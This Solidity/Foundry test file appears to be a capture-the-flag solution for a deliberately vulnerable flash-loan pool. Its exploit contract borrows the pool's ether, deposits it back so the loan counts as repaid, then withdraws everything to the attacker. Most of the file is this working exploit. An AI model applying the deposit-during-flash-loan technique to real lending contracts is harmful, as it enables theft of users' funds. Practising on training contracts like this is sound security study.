// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {
    SideEntranceLenderPool,
    IFlashLoanEtherReceiver
} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract Attacks is IFlashLoanEtherReceiver {
    uint256 balance;
    address addr;
    address owner;

    constructor(address _addr, uint256 _balance) {
        balance = _balance;
        addr = _addr;
        owner = msg.sender;
    }

    function run() external {
        SideEntranceLenderPool(addr).flashLoan(balance);
        // payable(msg.sender).call(abi.encodeWithSignature("flashLoan(uint256)", balance));
    }

    function execute() external payable {
        SideEntranceLenderPool(addr).deposit{value: msg.value}();
    }

    fallback() external payable {}

    function withdraw(uint256 amount) external payable returns (bool) {
        // payable(msg.sender).call{value: amount}(abi.encodeWithSignature("withdraw()"));
        console2.log(3, address(this).balance, amount);
        SideEntranceLenderPool(addr).withdraw();
        owner.call{value: address(this).balance}("");
        // return success;
    }
}

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        Attacks att = new Attacks(address(sideEntranceLenderPool), ETHER_IN_POOL);
        att.run();

        // att.(ETHER_IN_POOL);
        att.withdraw(0);
        // sideEntranceLenderPool.withdraw();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
